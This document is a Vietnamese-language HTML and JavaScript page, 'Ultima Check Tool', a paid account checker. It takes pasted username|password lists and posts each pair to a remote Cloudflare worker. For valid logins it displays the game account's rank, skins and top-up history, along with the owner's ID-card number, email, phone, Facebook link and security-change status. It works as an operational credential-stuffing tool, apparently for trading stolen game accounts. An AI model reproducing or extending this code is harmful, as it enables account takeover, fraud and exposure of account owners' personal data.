<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultima Check Tool - Premium</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0a0b10;
            --panel: #13151b;
            --primary: #00f2ff;
            --success: #00ff9d;
            --error: #ff0055;
            --text: #e0e6ed;
            --border: #2a2f3d;
        }
        * { box-sizing: border-box; outline: none; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* Header & Stats */
        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 30px; background: rgba(19, 21, 27, 0.9); border-bottom: 1px solid var(--border); backdrop-filter: blur(10px); }
        .logo { font-size: 24px; font-weight: 800; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0, 242, 255, 0.5); }
        
        .user-panel { display: flex; gap: 20px; align-items: center; }
        .stat-box { background: #000; padding: 5px 15px; border-radius: 4px; border: 1px solid var(--border); font-family: 'Roboto Mono', monospace; font-size: 14px; }
        .stat-box span { color: var(--primary); font-weight: bold; }
        .stat-box.danger span { color: var(--error); }
        
        #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 999; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        #loginInput { padding: 15px; width: 300px; background: #000; border: 2px solid var(--primary); color: white; font-size: 18px; text-align: center; border-radius: 5px; margin-bottom: 20px; }
        
        /* Main Layout */
        .main-container { display: flex; flex: 1; padding: 20px; gap: 20px; height: calc(100vh - 70px); }
        
        /* Left: Input */
        .input-section { flex: 1; display: flex; flex-direction: column; gap: 15px; max-width: 400px; }
        .glass-panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; height: 100%; }
        
        h3 { margin: 0 0 15px 0; color: var(--text); font-size: 18px; text-transform: uppercase; border-left: 4px solid var(--primary); padding-left: 10px; }
        
        textarea { flex: 1; background: #08090c; border: 1px solid var(--border); color: #a0aec0; padding: 15px; resize: none; border-radius: 8px; font-family: 'Roboto Mono', monospace; font-size: 13px; line-height: 1.5; transition: 0.3s; }
        textarea:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(0, 242, 255, 0.1); color: white; }
        
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        button { flex: 1; padding: 15px; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; text-transform: uppercase; font-family: 'Rajdhani', sans-serif; font-size: 16px; transition: 0.2s; position: relative; overflow: hidden; }
        
        .btn-start { background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%); color: white; box-shadow: 0 4px 15px rgba(0, 180, 219, 0.3); }
        .btn-start:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 180, 219, 0.5); }
        .btn-start:active { transform: translateY(0); }
        .btn-start:disabled { background: #333; color: #666; cursor: not-allowed; transform: none; box-shadow: none; }
        
        /* Right: Output */
        .output-section { flex: 2; display: flex; flex-direction: column; height: 100%; }
        .result-list { flex: 1; overflow-y: auto; padding-right: 5px; display: flex; flex-direction: column; gap: 8px; }
        
        /* Custom Scrollbar cho danh s√°ch d·ªçc */
        .result-list::-webkit-scrollbar { width: 6px; }
        .result-list::-webkit-scrollbar-track { background: #000; }
        .result-list::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
        .result-list::-webkit-scrollbar-thumb:hover { background: var(--primary); }
        
        /* --- [CH·ªàNH S·ª¨A] CSS CHO THANH CU·ªòN NGANG --- */
        .res-item { 
            background: #1a1d26; 
            padding: 12px 15px; 
            border-radius: 6px; 
            border-left: 4px solid #555; 
            font-family: 'Roboto Mono', monospace; 
            font-size: 13px; 
            display: flex; 
            align-items: center; 
            justify-content: space-between; 
            animation: slideIn 0.3s ease;
            overflow: hidden; /* Gi·ªØ scrollbar b√™n trong */
        }
        .res-item.success { border-left-color: var(--success); background: rgba(0, 255, 157, 0.05); }
        .res-item.error { border-left-color: var(--error); background: rgba(255, 0, 85, 0.05); color: #ff88a0; }
        
        /* Ph·∫ßn ch·ª©a text: Cho ph√©p cu·ªôn ngang, kh√¥ng xu·ªëng d√≤ng */
        .res-text-container {
            flex: 1;
            overflow-x: auto; /* Hi·ªán thanh cu·ªôn ngang khi c·∫ßn */
            white-space: nowrap; /* Kh√¥ng bao gi·ªù xu·ªëng d√≤ng */
            margin-right: 10px;
            padding-bottom: 5px; /* T·∫°o kho·∫£ng tr·ªëng cho scrollbar ƒë·∫πp h∆°n */
        }

        /* T√πy ch·ªânh thanh cu·ªôn ngang nh·ªè g·ªçn */
        .res-text-container::-webkit-scrollbar { height: 6px; }
        .res-text-container::-webkit-scrollbar-track { background: #0a0b10; border-radius: 3px; }
        .res-text-container::-webkit-scrollbar-thumb { background: #444; border-radius: 3px; }
        .res-text-container::-webkit-scrollbar-thumb:hover { background: var(--primary); }

        .copy-btn { background: transparent; border: 1px solid #444; color: #888; padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; flex-shrink: 0; }
        .copy-btn:hover { border-color: var(--primary); color: var(--primary); }

        .summary-bar { margin-top: 15px; padding: 15px; background: #13151b; border-radius: 8px; display: flex; justify-content: space-between; border: 1px solid var(--border); font-weight: bold; }
        .sum-ok { color: var(--success); }
        .sum-fail { color: var(--error); }

        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
    </style>
</head>
<body>

    <div id="loginOverlay">
        <h2 style="color: var(--primary); margin-bottom: 20px;">X√ÅC TH·ª∞C NG∆Ø·ªúI D√ôNG</h2>
        <input type="text" id="loginInput" placeholder="Nh·∫≠p ID User (VD: 7239343492)">
        <button class="btn-start" style="width: 200px;" onclick="login()">TRUY C·∫¨P</button>
        <p style="color: #666; font-size: 12px; margin-top: 10px;">D·ªØ li·ªáu ƒë·ªçc t·ª´ database.js</p>
    </div>

    <header>
        <div class="logo">‚ö° ULTIMA TOOL</div>
        <div class="user-panel">
            <div class="stat-box">ID: <span id="displayId">---</span></div>
            <div class="stat-box" id="turnBox">L∆Ø·ª¢T: <span id="displayTurns">---</span></div>
        </div>
    </header>

    <div class="main-container">
        <div class="input-section">
            <div class="glass-panel">
                <h3>üì¶ DANH S√ÅCH T√ÄI KHO·∫¢N</h3>
                <textarea id="inputList" placeholder="Nh·∫≠p danh s√°ch (M·ªói d√≤ng 1 tk|mk)...&#10;user1|pass1&#10;user2|pass2"></textarea>
                <div class="btn-group">
                    <button id="btnStop" class="btn-start" style="background: #333; display: none;" onclick="stopCheck()">D·ª™NG L·∫†I</button>
                    <button id="btnCheck" class="btn-start" onclick="startCheck()">B·∫ÆT ƒê·∫¶U CHECK</button>
                </div>
                <div style="margin-top: 10px; font-size: 12px; color: #666; text-align: center;">
                    T·ª± ƒë·ªông x√≥a d√≤ng khi check xong
                </div>
            </div>
        </div>

        <div class="output-section">
            <div class="glass-panel" style="padding: 0; background: transparent; border: none; box-shadow: none;">
                <div class="result-list" id="resultContainer"></div>
                <div class="summary-bar">
                    <div>TH√ÄNH C√îNG: <span id="countOk" class="sum-ok">0</span></div>
                    <div>TH·∫§T B·∫†I: <span id="countFail" class="sum-fail">0</span></div>
                </div>
            </div>
        </div>
    </div>

    <script src="database.js"></script>
    <script>
        // --- C·∫§U H√åNH ---
        // Thay link worker c·ªßa b·∫°n v√†o ƒë√¢y
        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
        
        let currentUser = null;
        let isRunning = false;
        let stopSignal = false;
        let stats = { ok: 0, fail: 0 };

        function login() {
            const id = document.getElementById('loginInput').value.trim();
            if (!VIP_DATABASE[id]) {
                alert("‚ùå ID kh√¥ng t·ªìn t·∫°i ho·∫∑c ch∆∞a ƒëƒÉng k√Ω!");
                return;
            }
            currentUser = { id: id, data: VIP_DATABASE[id] };
            if (currentUser.data.turns <= 0) {
                alert("‚ö†Ô∏è T√†i kho·∫£n ƒë√£ h·∫øt l∆∞·ª£t s·ª≠ d·ª•ng (0 turns).");
                return;
            }
            document.getElementById('displayId').innerText = id;
            updateTurnDisplay();
            document.getElementById('loginOverlay').style.display = 'none';
        }

        function updateTurnDisplay() {
            const turnSpan = document.getElementById('displayTurns');
            const box = document.getElementById('turnBox');
            turnSpan.innerText = currentUser.data.turns;
            if (currentUser.data.turns < 10) box.classList.add('danger');
            else box.classList.remove('danger');
        }

        async function startCheck() {
            const textArea = document.getElementById('inputList');
            let lines = textArea.value.split('\n').filter(line => line.trim() !== "");
            if (lines.length === 0) { alert("‚ö†Ô∏è Danh s√°ch tr·ªëng!"); return; }
            if (currentUser.data.turns <= 0) { alert("‚õî H·∫æT L∆Ø·ª¢T! Vui l√≤ng n·∫°p th√™m."); return; }

            isRunning = true;
            stopSignal = false;
            document.getElementById('btnCheck').style.display = 'none';
            document.getElementById('btnStop').style.display = 'block';
            textArea.disabled = true;

            for (let i = 0; i < lines.length; i++) {
                if (stopSignal || currentUser.data.turns <= 0) break;
                const line = lines[i];
                if (!line.includes('|')) { addResult(line, "Sai ƒë·ªãnh d·∫°ng", false); continue; }

                const [user, pass] = line.split('|');
                const result = await checkAccount(user.trim(), pass.trim());
                
                currentUser.data.turns--;
                updateTurnDisplay();

                if (result.status === 'success') {
                    const d = result.data;
                    
                    // --- [S·ª¨A ƒê·ªîI] CHU·ªñI D·ªÆ LI·ªÜU ƒê·∫¶Y ƒê·ª¶ KH√îNG R√öT G·ªåN ---
                    // S·ª≠ d·ª•ng || "null" ƒë·ªÉ tr√°nh l·ªói n·∫øu API thi·∫øu tr∆∞·ªùng
                    const fullData = 
`${d.username}|${d.password} | ` +
`UID: ${d.uid || "null"} | ` +
`NAME: ${d.name || "null"} | ` +
`RANK: ${d.rank || "null"} | ` +
`LEVEL: ${d.level || "null"} | ` +
`T∆Ø·ªöNG: ${d.tuong || "null"} | ` +
`SKIN: ${d.skin || "null"} | ` +
`QH: ${d.qh || "null"} | ` +
`L·ªäCH S·ª¨ N·∫†P: ${d.lsnap || "null"} | ` +
`S√í: ${d.so || "null"} | ` +
`CCCD: ${d.cccd || "null"} | ` +
`EMAIL: ${d.email || "null"} | ` +
`AUTHEN: ${d.authen || "null"} | ` +
`SƒêT: ${d.sdt || "null"} | ` +
`FB: ${d.fb || "null"} | ` +
`BAND: ${d.band || "null"} | ` +
`NG√ÄY ƒêK: ${d.timeregacc || "null"} | ` +
`REGION: ${d.acc_country || "null"} | ` +
`LOGIN G·∫¶N NH·∫§T: ${d.lslogin || "null"} | ` +
`ƒê·ªîI MAIL: ${d.change_email || "null"} | ` +
`ƒê·ªîI SƒêT: ${d.change_sdt || "null"} | ` +
`ƒê·ªîI PASS: ${d.change_password || "null"} | ` +
`SS: ${d.ss || "null"} | ` +
`SSS: ${d.sss || "null"} | ` +
`SKIN HI·∫æM: ${d.skinlimited || "null"} | ` +
`MYSTIC: ${d.mystic || "null"} | ` +
`S-DREAMER: ${d.sdreamer || "null"} | ` +
`VALENTINE: ${d.valentine || "null"} | ` +
`OTHER: ${d.other || "null"} | ` +
`ANIME: ${d.anime || "null"} | ` +
`AOV: ${d.aov || "null"} | ` +
`HO·∫†T ƒê·ªòNG: ${d.tshoatdong || "null"} | ` +
`T√åNH TR·∫†NG: ${d.tt || "null"}`;

                    addResult(fullData, null, true);
                    stats.ok++;
                    const currentText = textArea.value;
                    const newText = currentText.replace(line + "\n", "").replace(line, ""); 
                    textArea.value = newText.trim();
                } else {
                    addResult(`${user}|${pass}`, result.msg || "L·ªói check", false);
                    stats.fail++;
                }

                document.getElementById('countOk').innerText = stats.ok;
                document.getElementById('countFail').innerText = stats.fail;
                await new Promise(r => setTimeout(r, 500));
            }
            stopCheck();
        }

        async function checkAccount(account, password) {
            try {
                const response = await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ account, password })
                });
                return await response.json();
            } catch (e) { return { status: 'error', msg: "L·ªói m·∫°ng/API" }; }
        }

        function stopCheck() {
            isRunning = false;
            stopSignal = true;
            document.getElementById('btnCheck').style.display = 'block';
            document.getElementById('btnStop').style.display = 'none';
            document.getElementById('inputList').disabled = false;
            if (currentUser.data.turns <= 0) alert("‚ö†Ô∏è ƒê√£ h·∫øt l∆∞·ª£t s·ª≠ d·ª•ng.");
        }

        function addResult(text, errorMsg, isSuccess) {
            const container = document.getElementById('resultContainer');
            const div = document.createElement('div');
            div.className = `res-item ${isSuccess ? 'success' : 'error'}`;
            
            const content = isSuccess ? text : `${text} -> [${errorMsg}]`;
            
            // C·∫•u tr√∫c m·ªõi: Container scroll ngang bao quanh text
            div.innerHTML = `
                <div class="res-text-container" title="${content}">${content}</div>
                <button class="copy-btn" onclick="navigator.clipboard.writeText(\`${content}\`)">COPY</button>
            `;
            
            container.insertBefore(div, container.firstChild);
        }
    </script>
</body>
</html>
